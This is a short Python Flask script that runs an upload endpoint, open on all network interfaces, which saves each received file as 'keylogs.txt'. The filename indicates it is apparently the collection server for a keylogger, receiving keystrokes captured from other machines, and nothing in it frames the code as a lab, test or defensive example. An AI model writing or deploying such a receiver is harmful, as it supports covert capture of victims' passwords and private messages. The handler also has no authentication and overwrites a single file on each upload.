from flask import Flask, request

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload_file():
    uploaded_file = request.files['file']
    if uploaded_file:
        uploaded_file.save("keylogs.txt")
        return "File uploaded successfully."
    else:
        return "No file received."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
